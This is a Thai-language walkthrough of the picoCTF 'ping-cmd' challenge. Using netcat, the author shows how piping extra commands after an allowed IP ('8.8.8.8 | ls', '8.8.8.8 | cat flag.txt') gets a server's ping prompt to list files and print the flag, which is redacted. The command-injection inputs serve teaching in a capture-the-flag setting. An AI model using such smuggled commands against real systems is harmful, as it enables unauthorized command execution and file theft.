Hi, Can you speak Thai ?

Yes, I can speak Thai.

มา วันนี้เราจะมาทำข้อ ping-cmd หมวด General Skills

# Step 1 nc

ใช้เครื่องมือ netcat เพื่อเชื่อมต่อไปยังเซิร์ฟเวอร์ โดยการคัดลอกแล้วเอามาวางใน kali ได้เลย

# Step 2 8.8.8.8

ในข้อนี้ ให้ผู้ใช้ป้อนค่า IP Address เพื่อนำไปใช้ในคำสั่ง ping บนระบบเซิร์ฟเวอร์ โดยมีข้อจำกัดว่าอนุญาตให้ใช้ได้เฉพาะ IP 8.8.8.8 เท่านั้น
```
┌──(kali㉿kali)-[~/Downloads/dancing]
└─$ nc mysterious-sea.picoctf.net 61374
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.51 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.56 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 9.513/9.535/9.557/0.022 ms
```

เห็นได้ว่าพอกรอก 1.1.1.1 ไป ระบบพยายาม ping แต่ทำไม่สำเร็จ
```
┌──(kali㉿kali)-[~/Downloads/dancing]
└─$ nc mysterious-sea.picoctf.net 61374
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 1.1.1.1
PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.

--- 1.1.1.1 ping statistics ---
2 packets transmitted, 0 received, 100% packet loss, time 1015ms
```

# Step 3 ls and cat

เราจะแทรกคำสั่งเพิ่มเติมผ่านไพป์ โดยจะเลือกใช้ ls ก่อน

คำสั่ง ls ทำหน้าที่แสดงรายชื่อไฟล์และโฟลเดอร์ที่อยู่ในตำแหน่งปัจจุบันที่ผู้ใช้งานกำลังอยู่ 
```                                                                                                                
┌──(kali㉿kali)-[~/Downloads/dancing]
└─$ nc mysterious-sea.picoctf.net 61374
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8 | ls
flag.txt
script.sh
```
ไฟล์ flag.txt คือไฟล์ที่เราสงสัยว่ามี flag อยู่ในนั้น เราจึงทำการ cat ในลำดับถัดไป

คำสั่ง cat ใช้สำหรับอ่านเนื้อหาภายในไฟล์, แสดงผลไฟล์ออกทางหน้าจอ Terminal, รวมไฟล์หลายไฟล์เข้าด้วยกัน, และสร้างไฟล์ใหม่
```
┌──(kali㉿kali)-[~/Downloads/dancing]
└─$ nc mysterious-sea.picoctf.net 61374
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8 | cat flag.txt
picoCTF{XXXXX}
```
XXXXX ไม่ใช่ flag นะ คือปิดไว้ จะได้ทำเอง
